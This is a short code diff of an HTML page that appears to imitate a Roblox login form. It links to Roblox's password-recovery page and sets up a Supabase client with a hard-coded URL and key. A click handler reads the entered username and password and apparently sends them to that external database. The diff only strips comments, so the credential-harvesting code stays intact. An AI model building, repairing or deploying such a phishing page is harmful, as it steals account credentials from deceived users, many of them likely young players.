@@ -20,15 +20,13 @@
     <br><br><hr><br>
 <a id="f" href="https://www.roblox.com/login/forgot-password-or-username">Forgot password?</a>
   </div>
-
-  <!-- load supabase client library -->
+  
   <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
   <script>
     const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
     const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // ↓ the only corrected section ↓
     document.getElementById('send').addEventListener('click', async () => {
       const username = document.getElementById('user').value;
       const password = document.getElementById('pass').value;
@@ -46,7 +44,7 @@
       } catch (err) {
         console.error('Network error:', err);
       }
-    }); // ✅ properly closes listener
+    });
   </script>
 </body>
 </html>
